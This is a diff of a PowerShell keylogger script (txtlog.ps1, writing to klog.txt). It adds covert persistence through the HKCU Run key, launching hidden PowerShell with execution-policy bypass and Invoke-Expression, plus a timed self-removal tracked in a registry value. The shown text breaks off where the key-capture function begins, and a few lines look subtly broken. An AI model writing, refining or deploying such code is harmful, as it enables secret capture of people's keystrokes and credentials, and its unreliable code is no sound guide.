@@ -1,13 +1,30 @@
-if(($Persistent -eq $true)){
-    $autostart = ('powershell -NoP -NonI -W Hidden -Exec Bypass -C cd $env:temp;sleep 1;$Hook=' + $Hook + ';$RunTime=' + $Runtime + ';$TimesRun=' + $TimesRun  + '$Persistent=' + $Persistent +  ';Get-Item txtlog.ps1 | Invoke-Expression;sleep 5;exit'); 
+if($DaysRun -eq -1 -or $DaysRun -gt 0){
+    if(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'txtlog'){ return };
+
+    $autostart = ('powershell -NoP -NonI -W Hidden -Exec Bypass -C cd $env:temp;sleep 1;$Hook=' + $Hook + ';$RunTime=' + $Runtime + ';$TimesRun=' + $TimesRun  + '$DaysRun=' + $DaysRun +  ';Get-Item txtlog.ps1 | Invoke-Expression;sleep 5;exit'); 
     New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'txtlog' -Value $autostart;
-}elseif(Test-Path -Path "$env:temp\txtlog.ps1" -PathType Leaf){
+
+    if($DaysRun -eq -1){ return };
+    if(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\Uinstall\txtlog' -Name 'date'){ return };
+
+    $date = (Get-Date).AddDays($daysRun);
+    New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\Uinstall\txtlog' -Name 'date' -Value $date;
+}
+
+if($DaysRun -gt 0){
+    $date = Get-Date;
+    $target = Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\Uinstall\txtlog' -Name 'date';
+
+    if($date -lt $target){ return }
+
     Remove-Item "$env:temp\txtlog.ps1" -Force;
+    Remove-Item -Path 'HKCU:\Software\Microsoft\Windows\Uinstall\txtlog' -Force
+    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' - Force
 }
 
 Do{
     $getT = Get-Date;
-    $end = $getT.addminutes($RunTime);
+    $end = $getT.AddMinutes($RunTime);
     
     function Start-Key($Path="$env:temp\klog.txt"){
         $sigs = "
